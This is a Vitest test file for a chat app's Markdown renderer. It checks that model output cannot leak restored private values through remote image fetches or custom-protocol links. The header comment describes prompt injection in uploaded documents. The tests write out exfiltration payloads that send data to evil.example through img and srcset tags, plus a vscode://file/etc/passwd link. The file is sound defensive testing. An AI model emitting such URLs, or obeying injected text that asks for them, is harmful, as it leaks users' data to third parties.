import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import Markdown from "@/components/chat/Markdown";
import { TooltipProvider } from "@/components/ui/tooltip";
import type { ProtectionHighlightAnnotation } from "@/lib/restore-highlights";

/**
 * Assistant markdown is model output, and a prompt injection in an uploaded document can ask the model
 * to emit a URL carrying a surrogate. The proxy restores the real value inside that URL, so anything the
 * browser fetches on render would send it to a third party with no click. Render the real component
 * (through Streamdown) and assert no remote fetch survives, while restored highlights still work.
 */

const value = "Aurora Holdings";
const exfil = `https://evil.example/p?c=${encodeURIComponent(value)}`;

function render(content: string, annotations: ProtectionHighlightAnnotation[] = []): string {
  return renderToStaticMarkup(createElement(TooltipProvider, null, createElement(Markdown, { content, annotations })));
}

function restored(content: string): ProtectionHighlightAnnotation[] {
  const start = content.indexOf(value);
  return [
    { start, end: start + value.length, surrogate: "[ficta:unrestored]", origin: "registry", direction: "restored" },
  ];
}

describe("Markdown exfiltration hardening", () => {
  it("blocks a markdown image with a remote URL", () => {
    const markup = render(`Summary.\n\n![logo](${exfil})`);
    expect(markup).not.toContain("evil.example");
    expect(markup).not.toMatch(/<img\b/);
  });

  it("blocks a raw HTML img, including when restore highlights are on", () => {
    const content = `${value} signed.\n\n<img src="${exfil}" alt="x">`;
    for (const markup of [render(content), render(content, restored(content))]) {
      expect(markup).not.toContain("evil.example");
      expect(markup).not.toMatch(/<img\b/);
    }
  });

  it("drops picture/source, whose srcset harden does not rewrite", () => {
    const markup = render(
      `<picture><source srcset="${exfil}"><img src="data:image/gif;base64,R0lGODlhAQABAAAAACw="></picture>`,
    );
    expect(markup).not.toContain("evil.example");
    expect(markup).not.toMatch(/<source\b|srcset/i);
  });

  it("drops custom-protocol links and keeps http(s) links behind the link-safety confirmation", () => {
    const markup = render("[open](vscode://file/etc/passwd) and [docs](https://ficta.sh/docs)");
    expect(markup).not.toContain("vscode://");
    expect(markup).toContain("open [blocked]");
    // Link safety renders a button that shows the full URL in a confirm dialog before opening it.
    expect(markup).toMatch(/<button[^>]*data-streamdown="link"[^>]*>docs<\/button>/);
    expect(markup).not.toMatch(/<a\b[^>]*href=/);
  });

  it("still renders restored values as highlight marks", () => {
    const content = `${value} retained the firm.`;
    const markup = render(content, restored(content));
    expect(markup).not.toContain("&lt;ficta-protection-restored");
    expect(markup).toContain(value);
    expect(markup).toContain("retained the firm.");
  });
});
